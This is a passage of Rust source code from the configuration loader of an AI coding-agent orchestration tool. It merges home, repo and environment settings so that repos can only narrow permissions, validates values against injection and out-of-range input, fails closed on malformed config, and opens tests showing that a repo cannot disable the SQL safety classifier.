            toml::Value::Integer(i64::from(narrow_min(
                home_max_diagnostics,
                repo_max_diagnostics,
                u32::MAX,
            ))),
        );
        let home_diagnostics_timeout_secs = home_diagnostics_timeout
            .and_then(|v| u64::try_from(v).ok())
            .unwrap_or(default_diagnostics.timeout_secs);
        let repo_diagnostics_timeout_secs =
            repo_diagnostics_timeout.and_then(|v| u64::try_from(v).ok());
        insert_path(
            &mut merged,
            &["diagnostics", "timeout_secs"],
            toml::Value::Integer(
                i64::try_from(narrow_min(
                    home_diagnostics_timeout_secs,
                    repo_diagnostics_timeout_secs,
                    u64::MAX,
                ))
                .unwrap_or(i64::MAX),
            ),
        );

        let default_missing_tests_gate = MissingTestsGateConfig::default();
        insert_path(
            &mut merged,
            &["missing_tests_gate", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_missing_tests_gate_enabled.unwrap_or(default_missing_tests_gate.enabled),
                repo_missing_tests_gate_enabled,
                true,
            )),
        );

        let default_subagent_stop_gate = SubagentStopGateConfig::default();
        insert_path(
            &mut merged,
            &["subagent_stop_gate", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_subagent_stop_gate_enabled.unwrap_or(default_subagent_stop_gate.enabled),
                repo_subagent_stop_gate_enabled,
                true,
            )),
        );

        let default_scope_guard = ScopeGuardConfig::default();
        insert_path(
            &mut merged,
            &["scope_guard", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_scope_guard_enabled.unwrap_or(default_scope_guard.enabled),
                repo_scope_guard_enabled,
                true,
            )),
        );

        let default_edit_guard = EditGuardConfig::default();
        insert_path(
            &mut merged,
            &["edit_guard", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_edit_guard_enabled.unwrap_or(default_edit_guard.enabled),
                repo_edit_guard_enabled,
                true,
            )),
        );

        let default_compact_advisory = CompactAdvisoryConfig::default();
        let home_compact_advisory_min_reclaim_tokens = home_compact_advisory_min_reclaim
            .and_then(|v| u64::try_from(v).ok())
            .unwrap_or(default_compact_advisory.min_reclaim_tokens);
        insert_path(
            &mut merged,
            &["compact_advisory", "min_reclaim_tokens"],
            toml::Value::Integer(
                i64::try_from(narrow_max(
                    home_compact_advisory_min_reclaim_tokens,
                    repo_compact_advisory_min_reclaim.and_then(|v| u64::try_from(v).ok()),
                    0,
                ))
                .unwrap_or(i64::MAX),
            ),
        );
        insert_path(
            &mut merged,
            &["compact_advisory", "window_fraction"],
            toml::Value::Float(narrow_max_f64(
                home_compact_advisory_window_fraction
                    .unwrap_or(default_compact_advisory.window_fraction),
                repo_compact_advisory_window_fraction,
                0.0,
            )),
        );

        let default_worker = WorkerConfig::default();
        let home_worker_max_depth_value = home_worker_max_depth
            .and_then(|v| u8::try_from(v).ok())
            .unwrap_or(default_worker.max_depth);
        let repo_worker_max_depth_value = repo_worker_max_depth.and_then(|v| u8::try_from(v).ok());
        insert_path(
            &mut merged,
            &["worker", "max_depth"],
            toml::Value::Integer(i64::from(narrow_min(
                home_worker_max_depth_value,
                repo_worker_max_depth_value,
                u8::MAX,
            ))),
        );
        insert_path(
            &mut merged,
            &["worker", "deny_network"],
            toml::Value::Boolean(narrow_max(
                home_worker_deny_network.unwrap_or(default_worker.deny_network),
                repo_worker_deny_network,
                false,
            )),
        );

        let default_worktree = WorktreeConfig::default();
        let home_worktree_idle_pool_max_value = home_worktree_idle_pool_max
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_worktree.idle_pool_max);
        let repo_worktree_idle_pool_max_value =
            repo_worktree_idle_pool_max.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["worktree", "idle_pool_max"],
            toml::Value::Integer(i64::from(narrow_min(
                home_worktree_idle_pool_max_value,
                repo_worktree_idle_pool_max_value,
                u32::MAX,
            ))),
        );
        let home_worktree_idle_ttl_secs_value = home_worktree_idle_ttl_secs
            .and_then(|v| u64::try_from(v).ok())
            .unwrap_or(default_worktree.idle_ttl_secs);
        let repo_worktree_idle_ttl_secs_value =
            repo_worktree_idle_ttl_secs.and_then(|v| u64::try_from(v).ok());
        insert_path(
            &mut merged,
            &["worktree", "idle_ttl_secs"],
            toml::Value::Integer(
                i64::try_from(narrow_min(
                    home_worktree_idle_ttl_secs_value,
                    repo_worktree_idle_ttl_secs_value,
                    u64::MAX,
                ))
                .unwrap_or(i64::MAX),
            ),
        );

        let default_objective = ObjectiveConfig::default();
        let home_objective_gates_value =
            home_objective_gates.unwrap_or_else(|| default_objective.gates.clone());
        insert_path(
            &mut merged,
            &["objective", "gates"],
            toml::Value::Array(
                narrow_objective_gates(home_objective_gates_value, repo_objective_gates)
                    .into_iter()
                    .map(toml::Value::String)
                    .collect(),
            ),
        );
        let home_objective_max_cycles_value = home_objective_max_cycles
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_objective.max_cycles_without_progress);
        let repo_objective_max_cycles_value =
            repo_objective_max_cycles.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["objective", "max_cycles_without_progress"],
            toml::Value::Integer(i64::from(narrow_min(
                home_objective_max_cycles_value,
                repo_objective_max_cycles_value,
                u32::MAX,
            ))),
        );
        insert_path(
            &mut merged,
            &["objective", "judge"],
            toml::Value::Boolean(narrow_min(
                home_objective_judge.unwrap_or(default_objective.judge),
                repo_objective_judge,
                true,
            )),
        );

        let default_screen = ScreenConfig::default();
        let home_screen_min_fragment_value = home_screen_min_fragment
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_screen.repetition_min_fragment);
        let repo_screen_min_fragment_value =
            repo_screen_min_fragment.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["screen", "repetition_min_fragment"],
            toml::Value::Integer(i64::from(narrow_min(
                home_screen_min_fragment_value,
                repo_screen_min_fragment_value,
                u32::MAX,
            ))),
        );
        let home_screen_window_value = home_screen_window
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_screen.repetition_window);
        let repo_screen_window_value = repo_screen_window.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["screen", "repetition_window"],
            toml::Value::Integer(i64::from(narrow_min(
                home_screen_window_value,
                repo_screen_window_value,
                u32::MAX,
            ))),
        );
        let home_screen_min_repeats_value = home_screen_min_repeats
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_screen.repetition_min_repeats);
        let repo_screen_min_repeats_value =
            repo_screen_min_repeats.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["screen", "repetition_min_repeats"],
            toml::Value::Integer(i64::from(narrow_min(
                home_screen_min_repeats_value,
                repo_screen_min_repeats_value,
                u32::MAX,
            ))),
        );
        insert_path(
            &mut merged,
            &["screen", "repetition_dominance_pct"],
            toml::Value::Float(narrow_min_f64(
                home_screen_dominance_pct.unwrap_or(default_screen.repetition_dominance_pct),
                repo_screen_dominance_pct,
                f64::MAX,
            )),
        );

        let default_fallback = FallbackConfig::default();
        let home_enabled = home_fallback_enabled.unwrap_or(default_fallback.enabled);
        insert_path(
            &mut merged,
            &["fallback", "enabled"],
            toml::Value::Boolean(home_enabled && repo_fallback_enabled.unwrap_or(true)),
        );
        let home_health_enabled =
            home_fallback_health_enabled.unwrap_or(default_fallback.health.enabled);
        insert_path(
            &mut merged,
            &["fallback", "health", "enabled"],
            toml::Value::Boolean(
                home_health_enabled && repo_fallback_health_enabled.unwrap_or(true),
            ),
        );
        let home_order = home_fallback_order.unwrap_or_else(|| default_fallback.order.clone());
        insert_path(
            &mut merged,
            &["fallback", "order"],
            toml::Value::Array(
                narrow_fallback_order(home_order, repo_fallback_order)
                    .into_iter()
                    .map(toml::Value::String)
                    .collect(),
            ),
        );
        insert_path(
            &mut merged,
            &["fallback", "predictive_headroom_pct"],
            toml::Value::Float(
                home_fallback_predictive
                    .unwrap_or(default_fallback.predictive_headroom_pct)
                    .min(repo_fallback_predictive.unwrap_or(f64::INFINITY)),
            ),
        );
        let merged_min_candidate = home_fallback_min_candidate
            .unwrap_or(default_fallback.min_candidate_headroom_pct)
            .max(repo_fallback_min_candidate.unwrap_or(f64::NEG_INFINITY));
        insert_path(
            &mut merged,
            &["fallback", "min_candidate_headroom_pct"],
            toml::Value::Float(merged_min_candidate),
        );
        insert_path(
            &mut merged,
            &["fallback", "unknown_headroom_pct"],
            toml::Value::Float(
                home_fallback_unknown
                    .unwrap_or(default_fallback.unknown_headroom_pct)
                    .min(repo_fallback_unknown.unwrap_or(f64::INFINITY)),
            ),
        );
        let home_small_tokens = home_fallback_small_tokens
            .and_then(|v| u64::try_from(v).ok())
            .unwrap_or(default_fallback.small_task_max_tokens);
        let repo_small_tokens = repo_fallback_small_tokens.and_then(|v| u64::try_from(v).ok());
        insert_path(
            &mut merged,
            &["fallback", "small_task_max_tokens"],
            toml::Value::Integer(
                home_small_tokens
                    .min(repo_small_tokens.unwrap_or(u64::MAX))
                    .try_into()
                    .unwrap_or(i64::MAX),
            ),
        );
        let home_small_tools = home_fallback_small_tools
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_fallback.small_task_max_tool_calls);
        let repo_small_tools = repo_fallback_small_tools.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["fallback", "small_task_max_tool_calls"],
            toml::Value::Integer(i64::from(
                home_small_tools.min(repo_small_tools.unwrap_or(u32::MAX)),
            )),
        );
        let home_adaptive = home_fallback_adaptive.unwrap_or(default_fallback.adaptive_delegation);
        insert_path(
            &mut merged,
            &["fallback", "adaptive_delegation"],
            toml::Value::Boolean(home_adaptive && repo_fallback_adaptive.unwrap_or(true)),
        );
        // Leave an undecided rollover absent so the live roster determines it; repo true cannot widen an unset home value.
        let merged_auto_rollover = match (home_fallback_auto_rollover, repo_fallback_auto_rollover)
        {
            (Some(home), repo) => Some(home && repo.unwrap_or(true)),
            (None, Some(false)) => Some(false),
            (None, _) => None,
        };
        if let Some(value) = merged_auto_rollover {
            insert_path(
                &mut merged,
                &["fallback", "auto_orchestrator_rollover"],
                toml::Value::Boolean(value),
            );
        }
        let merged_harness = narrow_fallback_harness(
            home_fallback_harness,
            repo_fallback_harness,
            merged_min_candidate,
        );
        insert_path(
            &mut merged,
            &["fallback", "harness"],
            toml::Value::Table(
                merged_harness
                    .into_iter()
                    .map(|(name, (max_active, reserve_headroom_pct))| {
                        let mut entry = toml::Table::new();
                        if let Some(max_active) = max_active {
                            entry
                                .insert("max_active".to_string(), toml::Value::Integer(max_active));
                        }
                        if let Some(reserve_headroom_pct) = reserve_headroom_pct {
                            entry.insert(
                                "reserve_headroom_pct".to_string(),
                                toml::Value::Float(reserve_headroom_pct),
                            );
                        }
                        (name, toml::Value::Table(entry))
                    })
                    .collect(),
            ),
        );

        for (var, path, kind) in ENV_MAP {
            if let Some(raw) = env(var) {
                let value = env_value(&raw, *kind).map_err(|e| format!("{var}: {e}"))?;
                if let Some(first_key) = path.first() {
                    key_origins.insert(first_key.to_string(), KeyOrigin::Env(var.to_string()));
                }
                insert_path(&mut merged, path, value);
            }
        }

        // Rewrite the deprecated heavy-worker alias after env merging so old env and TOML keys both load (#155).
        // The canonical key wins whenever both exist; no unknown alias may reach serde.
        if let Some(old) = take_nested(&mut merged, "supervise", "max_heavy_workers")
            && value_at(&merged, &["supervise", "max_heavy_operations"]).is_none()
        {
            insert_path(&mut merged, &["supervise", "max_heavy_operations"], old);
        }

        let mut cfg: Self = toml::Value::Table(merged).try_into().map_err(|e| {
            let error_msg = e.to_string();
            let msg: Box<dyn std::error::Error> =
                format_config_error(&error_msg, &key_origins).into();
            add_config_error_prefix(msg)
        })?;
        super::workspace::validate_catalogue(&cfg.workspace).map_err(add_config_error_prefix)?;

        // Copy write posture only after narrowing and env resolution so every prompt consumer sees the effective value.
        cfg.prompt.orchestrator_writes = cfg.supervise.orchestrator_writes;
        cfg.prompt.edit_guard = cfg.edit_guard.enabled;

        if let Some(raw) = env("ZIRV_CTX_FALLBACK_ORDER") {
            cfg.fallback.order = split_csv_list(&raw);
        }
        for (key, value) in [
            (
                "fallback.predictive_headroom_pct",
                cfg.fallback.predictive_headroom_pct,
            ),
            (
                "fallback.min_candidate_headroom_pct",
                cfg.fallback.min_candidate_headroom_pct,
            ),
            (
                "fallback.unknown_headroom_pct",
                cfg.fallback.unknown_headroom_pct,
            ),
        ] {
            if !(0.0..=100.0).contains(&value) {
                return Err(add_config_error_prefix(
                    format!("{key} must be between 0 and 100, got {value}").into(),
                ));
            }
        }
        let mut seen = std::collections::HashSet::new();
        for name in &cfg.fallback.order {
            if !super::adapters::ADAPTERS
                .iter()
                .any(|(known, _)| known == name)
            {
                return Err(add_config_error_prefix(
                    format!(
                        "fallback.order contains unknown agent '{name}'; known adapters: {}",
                        super::adapters::ADAPTERS
                            .iter()
                            .map(|(known, _)| *known)
                            .collect::<Vec<_>>()
                            .join(", ")
                    )
                    .into(),
                ));
            }
            if !seen.insert(name.clone()) {
                return Err(add_config_error_prefix(
                    format!("fallback.order contains duplicate agent '{name}'").into(),
                ));
            }
        }
        if let Some(value) = cfg.fallback.orchestrator_rollover_headroom_pct
            && !(0.0..=100.0).contains(&value)
        {
            return Err(add_config_error_prefix(
                format!(
                    "fallback.orchestrator_rollover_headroom_pct must be between 0 and 100, got {value}"
                )
                .into(),
            ));
        }
        // Keep the breaker threshold reachable within its observation ring; zero windows erase evidence and zero cooldowns thrash (#455).
        if !(1..=super::health::MAX_OBSERVATIONS as u32)
            .contains(&cfg.fallback.health.open_after_failures)
        {
            return Err(add_config_error_prefix(
                format!(
                    "fallback.health.open_after_failures must be between 1 and {}, got {}",
                    super::health::MAX_OBSERVATIONS,
                    cfg.fallback.health.open_after_failures
                )
                .into(),
            ));
        }
        for (key, value) in [
            (
                "fallback.health.window_secs",
                cfg.fallback.health.window_secs,
            ),
            (
                "fallback.health.cooldown_secs",
                cfg.fallback.health.cooldown_secs,
            ),
        ] {
            if value == 0 {
                return Err(add_config_error_prefix(
                    format!("{key} must be greater than 0, got {value}").into(),
                ));
            }
        }
        // Bound degradation rates and sample counts; sub-second latency thresholds would mark thinking models degraded.
        if !(1..=100).contains(&cfg.fallback.health.degrade_error_rate_pct) {
            return Err(add_config_error_prefix(
                format!(
                    "fallback.health.degrade_error_rate_pct must be between 1 and 100, got {}",
                    cfg.fallback.health.degrade_error_rate_pct
                )
                .into(),
            ));
        }
        // The sample minimum must fit the evidence ring; enabling latency uses the smaller ring's ceiling.
        let sample_ceiling = if cfg.fallback.health.degrade_ttft_ms.is_some() {
            super::health::MAX_OBSERVATIONS as u32
        } else {
            super::health::MAX_SAMPLES as u32
        };
        if !(2..=sample_ceiling).contains(&cfg.fallback.health.degrade_min_samples) {
            return Err(add_config_error_prefix(
                format!(
                    "fallback.health.degrade_min_samples must be between 2 and {sample_ceiling}, got {}",
                    cfg.fallback.health.degrade_min_samples
                )
                .into(),
            ));
        }
        if let Some(ttft_ms) = cfg.fallback.health.degrade_ttft_ms
            && ttft_ms < 1_000
        {
            return Err(add_config_error_prefix(
                format!("fallback.health.degrade_ttft_ms must be at least 1000, got {ttft_ms}")
                    .into(),
            ));
        }
        for (name, limits) in &cfg.fallback.harness {
            if !super::adapters::ADAPTERS
                .iter()
                .any(|(known, _)| known == name)
            {
                return Err(add_config_error_prefix(
                    format!(
                        "fallback.harness contains unknown agent '{name}'; known adapters: {}",
                        super::adapters::ADAPTERS
                            .iter()
                            .map(|(known, _)| *known)
                            .collect::<Vec<_>>()
                            .join(", ")
                    )
                    .into(),
                ));
            }
            if let Some(value) = limits.reserve_headroom_pct
                && !(0.0..=100.0).contains(&value)
            {
                return Err(add_config_error_prefix(
                    format!(
                        "fallback.harness.{name}.reserve_headroom_pct must be between 0 and 100, got {value}"
                    )
                    .into(),
                ));
            }
        }

        // Union home and repo denials so neither loses restrictions; operator CSV env overrides replace the result outright.
        cfg.sandbox.extra_deny = match env("ZIRV_CTX_SANDBOX_EXTRA_DENY") {
            Some(raw) => split_csv_list(&raw),
            None => {
                let mut combined = home_extra_deny;
                combined.extend(repo_extra_deny);
                combined
            }
        };
        if let Some(raw) = env("ZIRV_CTX_SANDBOX_EXTRA_ALLOW") {
            cfg.sandbox.extra_allow = split_csv_list(&raw);
        }

        // Operator env replaces workdir roots; repo contributions are forbidden.
        if let Some(raw) = env("ZIRV_CTX_DASH_WORKDIR_ROOTS") {
            cfg.dash.workdir_roots = split_csv_list(&raw);
        }

        // Operator env replaces the disallowed-tool list; repo contributions are forbidden.
        if let Some(raw) = env("ZIRV_CTX_HEADLESS_DISALLOWED_TOOLS") {
            cfg.headless.disallowed_tools = split_csv_list(&raw);
        }

        // Operator env replaces the configured list, which only adds to built-in check passthrough at use.
        if let Some(raw) = env("ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH") {
            cfg.workflow.check_env_passthrough = split_csv_list(&raw);
        }

        // Operator env replaces the built-in check exclusion list (#276).
        if let Some(raw) = env("ZIRV_CTX_WORKFLOW_BUILTIN_CHECKS_EXCLUDE") {
            cfg.workflow.builtin_checks_exclude = split_csv_list(&raw);
        }

        // Operator CSV env replaces the verbatim list; repos cannot contribute (#326).
        if let Some(raw) = env("ZIRV_CTX_OUTPUT_VERBATIM") {
            cfg.output.verbatim = split_csv_list(&raw);
        }

        // Reject caps too small for header, failure and retrieval lines; never silently clamp or emit a summary hiding failures.
        if cfg.output.max_summary_bytes < MIN_MAX_SUMMARY_BYTES {
            return Err(add_config_error_prefix(
                format!(
                    "`output.max_summary_bytes` must be at least {MIN_MAX_SUMMARY_BYTES} (got {}): a \
                     smaller cap cannot hold a summary's own failure lines and its retrieval line.",
                    cfg.output.max_summary_bytes
                )
                .into(),
            ));
        }

        // Validate operator rule names and anchored regexes once so application can trust them (#417).
        validate_output_filter_rules(&cfg.output.filter)?;

        // Validate operator rules before appending bundled defaults; operator order and duplicate names take precedence.
        // Bundled rules already satisfy regex and uniqueness validation.
        if cfg.output.filter_defaults {
            let operator_names: Vec<String> = cfg
                .output
                .filter
                .iter()
                .map(|rule| rule.name.clone())
                .collect();
            cfg.output.filter.extend(
                super::output_filters::bundled_output_filter_rules()
                    .into_iter()
                    .filter(|rule| !operator_names.contains(&rule.name)),
            );
        }

        // Union heavy patterns so repos can only add restrictions, never remove operator entries.
        let mut heavy_patterns = home_heavy_patterns;
        heavy_patterns.extend(repo_heavy_patterns);
        cfg.supervise.heavy_command_patterns = heavy_patterns;

        // Windows npm `.cmd` shims reparse argv through cmd.exe; reject model metacharacters to prevent repo command injection.
        // Apply the same guard after env merging; preserve `:`, `/` and `@` for vendor model ids.
        if let Some(model) = cfg.chat.model.as_deref() {
            validate_model_str("chat.model", model)?;
        }

        // Validate permission mode before argv construction; unknown values hard-error instead of silently defaulting (#504).
        if let Some(mode) = cfg.chat.claude_permission_mode.as_deref()
            && !matches!(mode, "default" | "acceptEdits" | "bypassPermissions")
        {
            return Err(add_config_error_prefix(
                format!(
                    "chat.claude_permission_mode must be \"default\", \"acceptEdits\" or \
                     \"bypassPermissions\", got \"{mode}\""
                )
                .into(),
            ));
        }

        cfg.approvals.validate().map_err(add_config_error_prefix)?;

        // TTL reaches Claude's environment verbatim; reject unsupported values at load time (#788).
        if let Some(ttl) = cfg.headless.prompt_cache_ttl.as_deref()
            && !matches!(ttl, "5m" | "1h")
        {
            return Err(add_config_error_prefix(
                format!("headless.prompt_cache_ttl must be \"5m\" or \"1h\", got \"{ttl}\"").into(),
            ));
        }
        if let Some(ttl) = cfg.runtime.prompt_cache_ttl.as_deref()
            && !matches!(ttl, "5m" | "1h")
        {
            return Err(add_config_error_prefix(
                format!("runtime.prompt_cache_ttl must be \"5m\" or \"1h\", got \"{ttl}\"").into(),
            ));
        }
        for (key, effort) in [
            ("headless.effort.trivial", &cfg.headless.effort.trivial),
            ("headless.effort.bounded", &cfg.headless.effort.bounded),
            (
                "headless.effort.substantial",
                &cfg.headless.effort.substantial,
            ),
        ] {
            if let Some(level) = effort.as_deref()
                && !matches!(level, "low" | "medium" | "high" | "xhigh" | "max")
            {
                return Err(add_config_error_prefix(
                    format!(
                        "{key} must be \"low\", \"medium\", \"high\", \"xhigh\" or \"max\", got \
                         \"{level}\""
                    )
                    .into(),
                ));
            }
        }

        // Guard review model text against injection and later reuse as argv; operator-only provenance is not enough.
        if let Some(model) = cfg.review.claude.as_deref() {
            validate_model_str("review.claude", model)?;
        }
        if let Some(model) = cfg.review.codex.as_deref() {
            validate_model_str("review.codex", model)?;
        }

        // Worker models reach launch argv directly and need the same injection guard.
        if let Some(model) = cfg.worker.claude.as_deref() {
            validate_model_str("worker.claude", model)?;
        }
        if let Some(model) = cfg.worker.codex.as_deref() {
            validate_model_str("worker.codex", model)?;
        }
        if let Some(effort) = cfg.worker.codex_effort.as_deref() {
            validate_model_str("worker.codex_effort", effort)?;
        }
        if cfg.worker.bootstrap_timeout_secs == 0 {
            return Err(add_config_error_prefix(
                "worker.bootstrap_timeout_secs must be greater than 0, got 0".into(),
            ));
        }

        // Every handover model leaf reaches argv and needs the same injection guard.
        if let Some(model) = cfg.handover.claude.cheap.as_deref() {
            validate_model_str("handover.claude.cheap", model)?;
        }
        if let Some(model) = cfg.handover.claude.standard.as_deref() {
            validate_model_str("handover.claude.standard", model)?;
        }
        if let Some(model) = cfg.handover.claude.deep.as_deref() {
            validate_model_str("handover.claude.deep", model)?;
        }
        if let Some(model) = cfg.handover.codex.cheap.as_deref() {
            validate_model_str("handover.codex.cheap", model)?;
        }
        if let Some(model) = cfg.handover.codex.standard.as_deref() {
            validate_model_str("handover.codex.standard", model)?;
        }
        if let Some(model) = cfg.handover.codex.deep.as_deref() {
            validate_model_str("handover.codex.deep", model)?;
        }

        // Every seat-tier model leaf reaches argv and needs the same injection guard (#699).
        if let Some(model) = cfg.model_tiers.claude.fast.as_deref() {
            validate_model_str("model_tiers.claude.fast", model)?;
        }
        if let Some(model) = cfg.model_tiers.claude.standard.as_deref() {
            validate_model_str("model_tiers.claude.standard", model)?;
        }
        if let Some(model) = cfg.model_tiers.claude.deep.as_deref() {
            validate_model_str("model_tiers.claude.deep", model)?;
        }
        if let Some(model) = cfg.model_tiers.codex.fast.as_deref() {
            validate_model_str("model_tiers.codex.fast", model)?;
        }
        if let Some(model) = cfg.model_tiers.codex.standard.as_deref() {
            validate_model_str("model_tiers.codex.standard", model)?;
        }
        if let Some(model) = cfg.model_tiers.codex.deep.as_deref() {
            validate_model_str("model_tiers.codex.deep", model)?;
        }
        for (family_key, model) in &cfg.models.pin {
            validate_model_str(&format!("models.pin.{family_key}"), model)?;
            let Some((vendor, family)) = family_key.split_once('.') else {
                return Err(add_config_error_prefix(
                    format!("models.pin key '{family_key}' must be vendor.family").into(),
                ));
            };
            if super::catalogue::model_family(vendor, model) != Some(family) {
                return Err(add_config_error_prefix(
                    format!(
                        "models.pin.{family_key} model '{model}' is not a known {vendor}.{family} family id"
                    )
                    .into(),
                ));
            }
        }

        for model in &cfg.models.avoid {
            validate_model_str("models.avoid", model)?;
        }

        // Validate operator endpoints once so downstream launch code can trust catalogue membership (#395).
        if let Some(target) = cfg.endpoint.claude.as_ref() {
            validate_endpoint_target("endpoint.claude", target)?;
        }
        if let Some(target) = cfg.endpoint.codex.as_ref() {
            validate_endpoint_target("endpoint.codex", target)?;
        }

        // Reject proxy bounds at load time; downstream readers must not silently clamp them (#537).
        if !(0.0..=1.0).contains(&cfg.proxy.min_confidence) {
            return Err(add_config_error_prefix(
                format!(
                    "proxy.min_confidence must be between 0.0 and 1.0, got {}",
                    cfg.proxy.min_confidence
                )
                .into(),
            ));
        }
        if !(0.0..=1.0).contains(&cfg.proxy.min_margin) {
            return Err(add_config_error_prefix(
                format!(
                    "proxy.min_margin must be between 0.0 and 1.0, got {}",
                    cfg.proxy.min_margin
                )
                .into(),
            ));
        }
        cfg.supervisor
            .validate()
            .map_err(|message| add_config_error_prefix(message.into()))?;
        // Reject out-of-range advisory floors at load time (#803).
        for (site, floor) in [
            ("memory", &cfg.jev.floors.memory),
            ("context", &cfg.jev.floors.context),
            ("harvest_screen", &cfg.jev.floors.harvest_screen),
            ("handoff_select", &cfg.jev.floors.handoff_select),
            ("compaction_select", &cfg.jev.floors.compaction_select),
            ("dispatch", &cfg.jev.floors.dispatch),
            ("launch_effort", &cfg.jev.floors.launch_effort),
            ("classify", &cfg.jev.floors.classify),
            ("inject", &cfg.jev.floors.inject),
        ] {
            if let Some(min_confidence) = floor.min_confidence
                && !(0.0..=1.0).contains(&min_confidence)
            {
                return Err(add_config_error_prefix(
                    format!(
                        "jev.floors.{site}.min_confidence must be between 0.0 and 1.0, got {min_confidence}"
                    )
                    .into(),
                ));
            }
            if let Some(min_margin) = floor.min_margin
                && !(0.0..=1.0).contains(&min_margin)
            {
                return Err(add_config_error_prefix(
                    format!(
                        "jev.floors.{site}.min_margin must be between 0.0 and 1.0, got {min_margin}"
                    )
                    .into(),
                ));
            }
        }
        if cfg.proxy.typesafe.timeout_secs < 1 {
            return Err(add_config_error_prefix(
                format!(
                    "proxy.typesafe.timeout_secs must be at least 1, got {}",
                    cfg.proxy.typesafe.timeout_secs
                )
                .into(),
            ));
        }
        if cfg.proxy.request_max_bytes < MIN_PROXY_REQUEST_MAX_BYTES {
            return Err(add_config_error_prefix(
                format!(
                    "proxy.request_max_bytes must be at least {MIN_PROXY_REQUEST_MAX_BYTES}, got {}",
                    cfg.proxy.request_max_bytes
                )
                .into(),
            ));
        }

        cfg.agents = if read_repo_layer {
            crate::settings::AgentGate::load(repo, env).map_err(add_config_error_prefix)?
        } else {
            crate::settings::AgentGate::load_operator_only(env)
        };
        cfg.policy = super::policy::resolve(home_policy, repo_policy, env)
            .map_err(add_config_error_prefix)?;
        cfg.safety = super::safety::resolve(home_safety, repo_safety, env)
            .map_err(add_config_error_prefix)?;
        cfg.unparsable_layers = unparsable_layers;
        announce_unparsable_layers_once(&cfg);
        Ok(cfg)
    }

    /// Refuse malformed home config before any launch: falling back could widen operator pacing, policy or sandbox settings.
    /// Untrusted repo parse failures remain skippable; diagnostic-only callers may use `load`.
    pub fn load_for_launch(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        let cfg = Self::load(repo, env)?;
        if let Some(layer) = cfg.unparsable_layers.iter().find(|l| l.is_home) {
            return Err(format!(
                "{}: {}\nThis is your own home config (~/{}/{}), not the repo's -- fix the \
                 syntax error above, or remove the file to fall back to defaults. Refusing to \
                 launch rather than silently dropping back to permissive pacing/policy/sandbox \
                 defaults.",
                layer.path.display(),
                layer.message,
                crate::utils::SCRIPT_DIR_NAME,
                CTX_CONFIG_FILE,
            )
            .into());
        }
        Ok(cfg)
    }
}

/// Announce malformed layers once per process unless operator event settings suppress them; loads share no per-run state.
fn announce_unparsable_layers_once(cfg: &CtxConfig) {
    if cfg.unparsable_layers.is_empty() || !cfg.chrome.events {
        return;
    }
    static ANNOUNCED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
    let already_announced = ANNOUNCED
        .compare_exchange(
            false,
            true,
            std::sync::atomic::Ordering::SeqCst,
            std::sync::atomic::Ordering::SeqCst,
        )
        .is_err();
    if already_announced {
        return;
    }
    let detail = cfg
        .unparsable_layers
        .iter()
        .map(|layer| format!("{}: {}", layer.path.display(), layer.message))
        .collect::<Vec<_>>()
        .join("; ");
    super::announce::Announcer::new(true, console::colors_enabled_stderr())
        .emit(&super::announce::Event::ConfigUnparsable { detail });
}

/// Degrade nonfatal config failures with the operator-only agent gate and closed policy, never permissive defaults (#44).
/// Force both write-posture copies to Deny: unreadable config is never authority to write (#358).
pub(crate) fn degrade_to_operator_only(env: EnvLookup<'_>) -> CtxConfig {
    let mut cfg = CtxConfig {
        agents: crate::settings::AgentGate::load_operator_only(env),
        policy: super::policy::EffectivePolicy::fail_closed(),
        obfuscate: ObfuscateConfig::load_operator_only(env)
            .unwrap_or_else(|_| ObfuscateConfig::fail_closed()),
        ..CtxConfig::default()
    };
    cfg.supervise.orchestrator_writes = OrchestratorWrites::Deny;
    cfg.prompt.orchestrator_writes = OrchestratorWrites::Deny;
    // Defaults omit bundled filters; degraded loads add them so unreadable config still receives ordinary noise compaction.
    cfg.output.filter = super::output_filters::bundled_output_filter_rules();
    cfg
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn env_map(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    /// SECURITY: `safety.sql` joins `safety.allow`/`safety.default`/
    /// `safety.interactive_default` as operator-only. Turning the SQL
    /// classifier off removes the `Ask` narrowing it applies to a write
    /// statement that would otherwise reach the permissive interactive
    /// default -- there is no narrowing reading of `off`.
    #[test]
    fn a_repo_ctx_toml_cannot_turn_the_sql_classifier_off() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[safety]\nsql = \"off\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set safety.sql");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    /// `load_trusted_only` is the safe fallback for a refused repo layer: it
    /// loads where `load` refuses, and applies the operator layer, not the repo's.
    #[test]
    fn load_trusted_only_ignores_a_repo_layer_that_load_refuses() {
        let repo = tempfile::tempdir().expect("repo");
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
